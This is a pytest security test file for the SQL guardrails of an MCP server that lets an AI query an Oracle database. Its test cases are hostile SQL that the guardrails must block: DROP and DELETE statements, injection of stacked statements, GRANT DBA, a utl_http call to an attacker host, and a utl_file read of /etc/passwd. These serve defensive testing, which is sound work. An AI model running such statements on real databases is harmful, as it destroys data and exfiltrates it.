"""
Security tests for the SQL guardrails.

Every test in this file represents a real attack vector. If any of
these tests fails, the MCP server is no longer safe to expose.

The guardrails are the difference between "Claude can query my Oracle"
and "Claude can DROP my Oracle". Treat them as production code.
"""
import pytest

from mcp_oracle_dba.guardrails import (
    SqlGuardError,
    redact_pii_columns,
    validate_select,
)


# ───────────────────────────────────────────────────────────────────
# DDL — must all be blocked
# ───────────────────────────────────────────────────────────────────

@pytest.mark.parametrize("ddl", [
    "DROP TABLE fnd_user",
    "drop table fnd_user",                      # case-insensitive
    "DROP TABLE IF EXISTS fnd_user",
    "CREATE TABLE evil (id NUMBER)",
    "ALTER TABLE fnd_user DROP COLUMN password",
    "TRUNCATE TABLE wf_notifications",
    "RENAME fnd_user TO fnd_user_old",
])
def test_blocks_ddl(ddl):
    with pytest.raises(SqlGuardError):
        validate_select(ddl)


# ───────────────────────────────────────────────────────────────────
# DML — must all be blocked
# ───────────────────────────────────────────────────────────────────

@pytest.mark.parametrize("dml", [
    "DELETE FROM gl_je_headers",
    "UPDATE ap_invoices SET amount=0 WHERE 1=1",
    "INSERT INTO fnd_user VALUES (1,2,3)",
    "MERGE INTO target USING source ON (target.id = source.id) "
    "WHEN MATCHED THEN UPDATE SET col=1",
])
def test_blocks_dml(dml):
    with pytest.raises(SqlGuardError):
        validate_select(dml)


# ───────────────────────────────────────────────────────────────────
# Multi-statement injection — must all be blocked
# ───────────────────────────────────────────────────────────────────

@pytest.mark.parametrize("sql", [
    "SELECT 1 FROM dual; DROP TABLE fnd_user",
    "SELECT user FROM dual; DELETE FROM gl_je_headers",
    "SELECT 1; SELECT 2",                       # two selects also blocked
])
def test_blocks_multi_statement(sql):
    with pytest.raises(SqlGuardError):
        validate_select(sql)


# ───────────────────────────────────────────────────────────────────
# PL/SQL blocks and procedure calls — must all be blocked
# ───────────────────────────────────────────────────────────────────

@pytest.mark.parametrize("sql", [
    "BEGIN dbms_lock.sleep(60); END;",
    "DECLARE x NUMBER; BEGIN x := 1; END;",
    "CALL dbms_stats.gather_table_stats('APPS','FND_USER')",
    "EXECUTE dbms_session.kill_session(...)",
    "EXEC dbms_lock.sleep(1)",
])
def test_blocks_plsql_blocks(sql):
    with pytest.raises(SqlGuardError):
        validate_select(sql)


# ───────────────────────────────────────────────────────────────────
# Dangerous package calls inside SELECT — must all be blocked
# ───────────────────────────────────────────────────────────────────

@pytest.mark.parametrize("sql", [
    "SELECT dbms_random.value FROM dual",
    "SELECT utl_http.request('http://attacker.com') FROM dual",
    "SELECT utl_file.fopen('/etc/passwd','R') FROM dual",
    "SELECT sys.dbms_obfuscation_toolkit.md5('x') FROM dual",
    "SELECT 1 FROM dual WHERE dbms_lock.sleep(60) IS NULL",
])
def test_blocks_dangerous_package_calls(sql):
    with pytest.raises(SqlGuardError):
        validate_select(sql)


# ───────────────────────────────────────────────────────────────────
# Privilege changes and transaction control — must all be blocked
# ───────────────────────────────────────────────────────────────────

@pytest.mark.parametrize("sql", [
    "GRANT DBA TO mcp_ro",
    "REVOKE SELECT_CATALOG_ROLE FROM mcp_ro",
    "COMMIT",
    "ROLLBACK",
    "SAVEPOINT foo",
    "LOCK TABLE fnd_user IN EXCLUSIVE MODE",
])
def test_blocks_privilege_and_txn(sql):
    with pytest.raises(SqlGuardError):
        validate_select(sql)


# ───────────────────────────────────────────────────────────────────
# Empty / malformed — must all be blocked
# ───────────────────────────────────────────────────────────────────

@pytest.mark.parametrize("sql", [
    "",
    "   ",
    None,
])
def test_blocks_empty_or_none(sql):
    with pytest.raises((SqlGuardError, AttributeError)):
        validate_select(sql)


# ───────────────────────────────────────────────────────────────────
# Allowed queries — must all pass
# ───────────────────────────────────────────────────────────────────

@pytest.mark.parametrize("sql", [
    "SELECT user FROM dual",
    "SELECT * FROM fnd_user",
    "SELECT count(*) FROM v$session",
    "WITH t AS (SELECT 1 AS x FROM dual) SELECT * FROM t",
    "SELECT a.column_name FROM all_tab_columns a WHERE a.owner = 'APPS'",
    "SELECT 1 FROM dual",
    "select 1 from dual",                       # case insensitive
    # Trailing semicolon is OK (we strip it)
    "SELECT 1 FROM dual;",
])
def test_allows_selects(sql):
    safe = validate_select(sql)
    assert "FETCH FIRST" in safe.upper()       # row cap injected
    assert "SELECT" in safe.upper()


# ───────────────────────────────────────────────────────────────────
# Row cap behavior
# ───────────────────────────────────────────────────────────────────

def test_row_cap_uses_setting():
    safe = validate_select("SELECT 1 FROM dual", max_rows=50)
    assert "FETCH FIRST 50 ROWS ONLY" in safe.upper()


# ───────────────────────────────────────────────────────────────────
# PII redaction
# ───────────────────────────────────────────────────────────────────

def test_redacts_pii_columns():
    rows = [
        {"USER_NAME": "alice", "SSN": "111-22-3333", "EMAIL": "a@b.com"},
        {"USER_NAME": "bob",   "SSN": "999-88-7777", "EMAIL": "b@c.com"},
    ]
    out = redact_pii_columns(rows, denylist=["SSN", "TAX_ID"])
    assert out[0]["USER_NAME"] == "alice"
    assert out[0]["SSN"] == "[REDACTED]"
    assert out[0]["EMAIL"] == "a@b.com"
    assert out[1]["SSN"] == "[REDACTED]"


def test_redaction_is_case_insensitive():
    rows = [{"employee_salary": 100000, "name": "x"}]
    out = redact_pii_columns(rows, denylist=["SALARY"])
    assert out[0]["employee_salary"] == "[REDACTED]"
    assert out[0]["name"] == "x"


def test_redaction_empty_inputs():
    assert redact_pii_columns([], denylist=["SSN"]) == []
    rows = [{"x": 1}]
    assert redact_pii_columns(rows, denylist=[]) == rows
